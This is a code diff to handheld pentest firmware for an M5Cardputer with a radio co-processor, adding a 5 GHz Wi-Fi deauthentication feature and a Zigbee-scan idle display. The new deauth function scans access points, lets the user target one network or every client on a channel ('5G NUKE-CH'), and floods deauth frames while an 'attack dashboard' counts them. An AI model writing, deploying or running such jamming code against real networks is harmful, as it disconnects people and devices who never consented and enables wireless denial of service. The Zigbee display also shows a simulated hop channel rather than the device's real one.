@@ -170,6 +170,125 @@ void feat_c5_scan_5g(void)
     }
 }
 
+/* ==================== C5 5 GHz Deauth ==================== */
+
+void feat_c5_deauth_5g(void)
+{
+    radio_switch(RADIO_WIFI);
+    c5_begin();
+    if (!c5_any_online()) { ui_toast("no C5 online", COL_BAD, 1500); return; }
+
+    /* Use the dual-band scan results if available; else trigger one. */
+    c5_ap_t aps[64];
+    int n = c5_aps(aps, 64);
+    if (n == 0) {
+        c5_clear_results();
+        c5_cmd_scan_5g(400);
+        ui_toast("scanning first...", COL_ACCENT, 1200);
+        delay(1500);
+        n = c5_aps(aps, 64);
+    }
+    /* Filter to 5 GHz only. */
+    int five_n = 0;
+    for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
+    n = five_n;
+    if (n == 0) {
+        ui_toast("no 5 GHz APs found", COL_WARN, 1500);
+        return;
+    }
+
+    /* Cursor select target. */
+    int cursor = 0;
+    auto &d = M5Cardputer.Display;
+    ui_draw_footer(";/. pick  ENTER=fire  X=all on ch  `=back");
+    bool picking = true;
+    int chosen = -1;
+    while (picking) {
+        ui_clear_body();
+        d.setTextColor(COL_MAGENTA, COL_BG);
+        d.setCursor(4, BODY_Y + 2); d.print("PICK 5 GHz TARGET");
+        d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, COL_MAGENTA);
+        int rows = 7;
+        if (cursor < 0) cursor = 0;
+        if (cursor >= n) cursor = n - 1;
+        int first = cursor - rows / 2;
+        if (first < 0) first = 0;
+        if (first + rows > n) first = (n > rows) ? (n - rows) : 0;
+        for (int r = 0; r < rows && first + r < n; ++r) {
+            int i = first + r;
+            const c5_ap_t &a = aps[i];
+            int y = BODY_Y + 18 + r * 12;
+            bool sel = (i == cursor);
+            if (sel) d.fillRect(0, y - 1, SCR_W, 12, 0x3007);
+            d.setTextColor(sel ? COL_ACCENT : COL_FG, sel ? 0x3007 : COL_BG);
+            d.setCursor(2, y);
+            d.printf("%4d ch%-3u %.20s", a.rssi, a.channel,
+                     a.ssid[0] ? a.ssid : "<hidden>");
+        }
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(30); continue; }
+        if (k == PK_ESC) return;
+        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
+        if (k == '.' || k == PK_DOWN) { cursor++; }
+        if (k == PK_ENTER) { chosen = cursor; picking = false; break; }
+        if (k == 'x' || k == 'X') {
+            /* Deauth everyone on the selected target's channel. */
+            uint8_t zero[6] = {0};
+            uint8_t ch = aps[cursor].channel;
+            c5_cmd_deauth(zero, ch, 1, 8000);
+            picking = false;
+            chosen = -2;  /* marker: bcast-all */
+        }
+    }
+
+    /* Live attack dashboard. */
+    uint16_t dur = 8000;
+    if (chosen >= 0) {
+        c5_cmd_deauth(aps[chosen].bssid, aps[chosen].channel, 0, dur);
+    }
+    const char *mode = (chosen == -2) ? "5G NUKE-CH" : "5G DEAUTH";
+    uint32_t end = millis() + dur + 1500;
+    uint32_t last = 0;
+    uint32_t last_frames = 0;
+    ui_clear_body();
+    ui_draw_footer("`=stop");
+    while (millis() < end) {
+        if (millis() - last > 200) {
+            last = millis();
+            uint32_t now_frames = c5_status_frames();
+            bool tick = (now_frames != last_frames);
+            last_frames = now_frames;
+            ui_clear_body();
+            ui_dashboard_chrome(mode, tick);
+            d.setTextColor(COL_FG, COL_BG);
+            d.setCursor(4, BODY_Y + 16);
+            if (chosen == -2) {
+                d.printf("ALL on ch%u", c5_status_channel());
+            } else {
+                const c5_ap_t &a = aps[chosen];
+                d.printf("%.22s", a.ssid[0] ? a.ssid : "<hidden>");
+                d.setTextColor(COL_DIM, COL_BG);
+                d.setCursor(4, BODY_Y + 28);
+                d.printf("ch%u  %02X:%02X:%02X:%02X:%02X:%02X",
+                         a.channel,
+                         a.bssid[0], a.bssid[1], a.bssid[2],
+                         a.bssid[3], a.bssid[4], a.bssid[5]);
+            }
+            d.setTextColor(COL_ACCENT, COL_BG);
+            d.setCursor(4, BODY_Y + 44);
+            d.printf("frames: %lu", (unsigned long)now_frames);
+            d.setCursor(4, BODY_Y + 56);
+            uint32_t left = (end - millis()) / 1000;
+            d.printf("time  : %lus", (unsigned long)left);
+            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 36);
+            ui_draw_status(radio_name(), "C5-DAUTH");
+        }
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(20); continue; }
+        if (k == PK_ESC) { c5_cmd_stop(); break; }
+    }
+}
+
 void feat_c5_scan_zb(void)
 {
     radio_switch(RADIO_WIFI);
@@ -198,9 +317,27 @@ void feat_c5_scan_zb(void)
             c5_zb_t z[32];
             int n = c5_zbs(z, 32);
             if (n == 0) {
-                d.setTextColor(COL_DIM, COL_BG);
+                /* Live "still alive" indicator — we have no frames but
+                 * the C5 IS hopping. Show simulated channel hop and a
+                 * pulse so silence reads as "no traffic" not "broken". */
+                uint8_t hop_ch = 11 + ((millis() / 500) % 16);  /* 11..26 */
+                d.setTextColor(COL_ACCENT, COL_BG);
                 d.setCursor(4, BODY_Y + 24);
+                d.printf("hopping ch%u", hop_ch);
+                d.setTextColor(COL_DIM, COL_BG);
+                d.setCursor(4, BODY_Y + 38);
                 d.print("listening on 802.15.4...");
+                d.setCursor(4, BODY_Y + 52);
+                d.print("(zigbee/thread/matter — silent");
+                d.setCursor(4, BODY_Y + 62);
+                d.print(" until a device transmits)");
+                /* Hop progress bar — fills 0->15 over the channel range. */
+                int bar = ((hop_ch - 11) * (SCR_W - 30)) / 15;
+                d.fillRect(4, BODY_Y + BODY_H - 18, bar, 3, COL_ACCENT);
+                d.drawRect(4, BODY_Y + BODY_H - 18, SCR_W - 30, 3, COL_DIM);
+                /* Pulse dot moving with hop. */
+                int px = 4 + bar;
+                d.fillCircle(px, BODY_Y + BODY_H - 17, 2, COL_MAGENTA);
             } else {
                 int rows = 7;
                 int first = n > rows ? n - rows : 0;
